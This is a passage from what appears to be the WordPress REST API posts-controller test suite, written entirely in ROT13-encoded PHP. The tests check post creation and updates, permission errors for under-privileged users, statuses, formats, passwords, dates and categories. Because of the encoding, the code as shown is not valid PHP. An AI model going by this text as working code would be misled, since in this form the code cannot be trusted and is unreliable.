		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgvpxl' => gehr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $arj_qngn['fgvpxl'] );
		$cbfg = trg_cbfg( $arj_qngn['vq'] );
		$guvf->nffregGehr( vf_fgvpxl( $cbfg->VQ ) );
	}

	choyvp shapgvba grfg_perngr_cbfg_fgvpxl_nf_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgvpxl' => gehr,
				'fgnghf' => 'craqvat',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_nffvta_fgvpxl', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_cbfg_bgure_nhgube_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'nhgube' => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_bguref', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'qensg',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_perngr_cbfg_qensg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'qensg',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'qensg', $qngn['fgnghf'] );
		$guvf->nffregFnzr( 'qensg', $arj_cbfg->cbfg_fgnghf );
		// Pbasvez qngrf ner fuvzzrq sbe tzg_bssfrg.
		$cbfg_zbqvsvrq_tzg = tzqngr( 'L-z-q U:v:f', fgegbgvzr( $arj_cbfg->cbfg_zbqvsvrq ) + ( trg_bcgvba( 'tzg_bssfrg' ) * 3600 ) );
		$cbfg_qngr_tzg     = tzqngr( 'L-z-q U:v:f', fgegbgvzr( $arj_cbfg->cbfg_qngr ) + ( trg_bcgvba( 'tzg_bssfrg' ) * 3600 ) );

		$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg_zbqvsvrq_tzg ), $qngn['zbqvsvrq_tzg'] );
		$guvf->nffregFnzr( zlfdy_gb_esp3339( $cbfg_qngr_tzg ), $qngn['qngr_tzg'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_cevingr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'cevingr',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'cevingr', $qngn['fgnghf'] );
		$guvf->nffregFnzr( 'cevingr', $arj_cbfg->cbfg_fgnghf );
	}

	choyvp shapgvba grfg_perngr_cbfg_cevingr_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$hfre = jc_trg_pheerag_hfre();
		$hfre->nqq_pnc( 'choyvfu_cbfgf', snyfr );
		// Syhfu pncnovyvgvrf, uggcf://pber.genp.jbeqcerff.bet/gvpxrg/28374
		$hfre->trg_ebyr_pncf();
		$hfre->hcqngr_hfre_yriry_sebz_pncf();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'cevingr',
				'nhgube' => frys::$nhgube_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_choyvfu', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_cbfg_choyvfu_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$hfre = jc_trg_pheerag_hfre();
		$hfre->nqq_pnc( 'choyvfu_cbfgf', snyfr );
		// Syhfu pncnovyvgvrf, uggcf://pber.genp.jbeqcerff.bet/gvpxrg/28374
		$hfre->trg_ebyr_pncf();
		$hfre->hcqngr_hfre_yriry_sebz_pncf();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'choyvfu',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_choyvfu', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_cbfg_vainyvq_fgnghf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'fgnghf' => 'grfgfgnghf',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'tnyyrel',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'tnyyrel', $qngn['sbezng'] );
		$guvf->nffregFnzr( 'tnyyrel', trg_cbfg_sbezng( $arj_cbfg->VQ ) );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_fgnaqneq_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'fgnaqneq',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( 'fgnaqneq', $qngn['sbezng'] );
		$guvf->nffregSnyfr( trg_cbfg_sbezng( $arj_cbfg->VQ ) );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_vainyvq_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'grfgsbezng',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Grfg jvgu n inyvq sbezng, ohg bar hafhccbegrq ol gur gurzr.
	 *
	 * uggcf://pber.genp.jbeqcerff.bet/gvpxrg/38610
	 */
	choyvp shapgvba grfg_perngr_cbfg_jvgu_hafhccbegrq_sbezng() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'sbezng' => 'yvax',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'yvax', $qngn['sbezng'] );
	}

	choyvp shapgvba grfg_perngr_hcqngr_cbfg_jvgu_srngherq_zrqvn() {

		$svyr          = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			$svyr,
			0,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'zrah_beqre'     => 1,
			)
		);

		$guvf->nggnpuzragf_perngrq = gehr;

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'srngherq_zrqvn' => $nggnpuzrag_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$guvf->nffregFnzr( $nggnpuzrag_vq, $qngn['srngherq_zrqvn'] );
		$guvf->nffregFnzr( $nggnpuzrag_vq, (vag) trg_cbfg_guhzoanvy_vq( $arj_cbfg->VQ ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf/' . $arj_cbfg->VQ );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'srngherq_zrqvn' => 0,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 0, $qngn['srngherq_zrqvn'] );
		$guvf->nffregFnzr( 0, (vag) trg_cbfg_guhzoanvy_vq( $arj_cbfg->VQ ) );
	}

	choyvp shapgvba grfg_perngr_cbfg_vainyvq_nhgube() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'nhgube' => -1,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_nhgube', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_cbfg_vainyvq_nhgube_jvgubhg_crezvffvba() {
		jc_frg_pheerag_hfre( frys::$nhgube_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'nhgube' => frys::$rqvgbe_vq,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg_bguref', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_cnffjbeq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => 'grfgvat',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grfgvat', $qngn['cnffjbeq'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_snyfrl_cnffjbeq() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => '0',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '0', $qngn['cnffjbeq'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_rzcgl_fgevat_cnffjbeq_naq_fgvpxl() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => '',
				'fgvpxl'   => gehr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( '', $qngn['cnffjbeq'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_cnffjbeq_naq_fgvpxl_snvyf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq' => '123',
				'fgvpxl'   => gehr,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_svryq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_cbfg_phfgbz_qngr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr' => '2010-01-01G02:00:00M',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$gvzr     = tzzxgvzr( 2, 0, 0, 1, 1, 2010 );
		$guvf->nffregFnzr( '2010-01-01G02:00:00', $qngn['qngr'] );
		$guvf->nffregFnzr( $gvzr, fgegbgvzr( $arj_cbfg->cbfg_qngr ) );
	}

	choyvp shapgvba grfg_perngr_cbfg_phfgbz_qngr_jvgu_gvzrmbar() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr' => '2010-01-01G02:00:00-10:00',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn     = $erfcbafr->trg_qngn();
		$arj_cbfg = trg_cbfg( $qngn['vq'] );
		$gvzr     = tzzxgvzr( 12, 0, 0, 1, 1, 2010 );

		$guvf->nffregFnzr( '2010-01-01G12:00:00', $qngn['qngr'] );
		$guvf->nffregFnzr( '2010-01-01G12:00:00', $qngn['zbqvsvrq'] );

		$guvf->nffregFnzr( $gvzr, fgegbgvzr( $arj_cbfg->cbfg_qngr ) );
		$guvf->nffregFnzr( $gvzr, fgegbgvzr( $arj_cbfg->cbfg_zbqvsvrq ) );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_qo_reebe() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn( neenl() );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );

		/**
		 * Qvfnoyr fubjvat reebe nf gur orybj vf tbvat gb vagragvbanyyl
		 * gevttre n QO reebe.
		 */
		tybony $jcqo;
		$jcqo->fhccerff_reebef = gehr;
		nqq_svygre( 'dhrel', neenl( $guvf, 'reebe_vafreg_dhrel' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'dhrel', neenl( $guvf, 'reebe_vafreg_dhrel' ) );
		$jcqo->fubj_reebef = gehr;

		$guvf->nffregReebeErfcbafr( 'qo_vafreg_reebe', $erfcbafr, 500 );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_vainyvq_qngr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr' => '2010-60-01G02:00:00M',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_vainyvq_qngr_tzg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr_tzg' => '2010-60-01G02:00:00',
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_dhbgrf_va_gvgyr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'gvgyr' => \"Ebo B'Ebhexr'f Qvnel\",
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( \"Ebo B'Ebhexr'f Qvnel\", $qngn['gvgyr']['enj'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_pngrtbevrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$pngrtbel = jc_vafreg_grez( 'Grfg Pngrtbel', 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq'   => 'grfgvat',
				'pngrtbevrf' => neenl(
					$pngrtbel['grez_vq'],
				),
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( $pngrtbel['grez_vq'] ), $qngn['pngrtbevrf'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_pngrtbevrf_nf_pfi() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$pngrtbel  = jc_vafreg_grez( 'Puvpxra', 'pngrtbel' );
		$pngrtbel2 = jc_vafreg_grez( 'Evof', 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'pngrtbevrf' => $pngrtbel['grez_vq'] . ',' . $pngrtbel2['grez_vq'],
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl( $pngrtbel['grez_vq'], $pngrtbel2['grez_vq'] ), $qngn['pngrtbevrf'] );
	}

	choyvp shapgvba grfg_perngr_cbfg_jvgu_vainyvq_pngrtbevrf() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq'   => 'grfgvat',
				'pngrtbevrf' => neenl(
					ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE,
				),
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( neenl(), $qngn['pngrtbevrf'] );
	}

	/**
	 * @gvpxrg 38505
	 */
	choyvp shapgvba grfg_perngr_cbfg_jvgu_pngrtbevrf_gung_pnaabg_or_nffvtarq_ol_pheerag_hfre() {
		$pngf                = frys::snpgbel()->pngrtbel->perngr_znal( 2 );
		$guvf->sbeovqqra_png = $pngf[1];

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/cbfgf' );
		$cnenzf  = $guvf->frg_cbfg_qngn(
			neenl(
				'cnffjbeq'   => 'grfgvat',
				'pngrtbevrf' => $pngf,
			)
		);
		$erdhrfg->frg_obql_cnenzf( $cnenzf );

		nqq_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_nffvta_grez' ), 10, 4 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( 'znc_zrgn_pnc', neenl( $guvf, 'eribxr_nffvta_grez' ), 10, 4 );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_nffvta_grez', $erfcbafr, 403 );
	}

	choyvp shapgvba eribxr_nffvta_grez( $pncf, $pnc, $hfre_vq, $netf ) {
		vs ( 'nffvta_grez' === $pnc && vffrg( $netf[0] ) && $guvf->sbeovqqra_png === $netf[0] ) {
			$pncf = neenl( 'qb_abg_nyybj' );
		}
		erghea $pncf;
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' );
		$cnenzf = $guvf->frg_cbfg_qngn();
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$cbfg_vq, $arj_qngn['vq'] );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $cnenzf['pbagrag'], $arj_qngn['pbagrag']['enj'] );
		$guvf->nffregFnzr( $cnenzf['rkprecg'], $arj_qngn['rkprecg']['enj'] );
		$cbfg = trg_cbfg( frys::$cbfg_vq );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $cnenzf['pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $cnenzf['rkprecg'], $cbfg->cbfg_rkprecg );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_ab_punatr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$cbfg = trg_cbfg( frys::$cbfg_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'nhgube', $cbfg->cbfg_nhgube );

		// Eha gjvpr gb znxr fher gung gur hcqngr fgvyy fhpprrqf
		// rira vs ab QO ebjf ner hcqngrq.
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
	}

	choyvp shapgvba grfg_erfg_hcqngr_cbfg() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', frys::$cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/wfba' );
		$cnenzf = $guvf->frg_cbfg_qngn();
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( frys::$cbfg_vq, $arj_qngn['vq'] );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $arj_qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( $cnenzf['pbagrag'], $arj_qngn['pbagrag']['enj'] );
		$guvf->nffregFnzr( $cnenzf['rkprecg'], $arj_qngn['rkprecg']['enj'] );
		$cbfg = trg_cbfg( frys::$cbfg_vq );
		$guvf->nffregFnzr( $cnenzf['gvgyr'], $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( $cnenzf['pbagrag'], $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( $cnenzf['rkprecg'], $cbfg->cbfg_rkprecg );
	}

	/**
	 * Irevsl gung hcqngvat n cbfg jvgu n `ahyy` qngr be qngr_tzg erfhygf va n erfrg cbfg, jurer nyy
	 * qngr inyhrf ner rdhny (qngr, qngr_tzg, qngr_zbqvsvrq naq qngr_zbqbsvrq_tzg) va gur NCV erfcbafr.
	 * Va gur qngnonfr, gur cbfg_qngr_tzg svryq vf erfrg gb gur qrsnhyg `0000-00-00 00:00:00`.
	 *
	 * @gvpxrg 44975
	 */
	choyvp shapgvba grfg_erfg_hcqngr_cbfg_jvgu_rzcgl_qngr() {
		// Perngr n arj grfg cbfg.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );

		// Frg gur cbfg qngr gb gur shgher.
		$shgher_qngr = '2919-07-29G18:00:00';

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', fcevags( '/jc/i2/cbfgf/%q', $cbfg_vq ) );
		$erdhrfg->nqq_urnqre( 'pbagrag-glcr', 'nccyvpngvba/wfba' );
		$cnenzf = $guvf->frg_cbfg_qngn(
			neenl(
				'qngr_tzg' => $shgher_qngr,
				'qngr'     => $shgher_qngr,
				'gvgyr'    => 'hcqngr',
				'fgnghf'   => 'qensg',
			)
		);
		$erdhrfg->frg_obql( jc_wfba_rapbqr( $cnenzf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_hcqngr_cbfg_erfcbafr( $erfcbafr );
		$arj_qngn = $erfcbafr->trg_qngn();

		// Irevsl gur cbfg vf frg gb gur shgher qngr.
		$guvf->nffregFnzr( $arj_qngn['qngr_tzg'], $shgher_qngr );
		$guvf->nffregFnzr( $arj_qngn['qngr'], $shgher_qngr );
		$guvf->nffregAbgRdhnyf( $arj_qngn['qngr_tzg'], $arj_qngn['zbqvsvrq_tzg'] );
		$guvf->nffregAbgRdhnyf( $arj_qngn['qngr'], $arj_qngn['zbqvsvrq'] );

		// Hcqngr cbfg jvgu n oynax svryq (qngr be qngr_tzg).
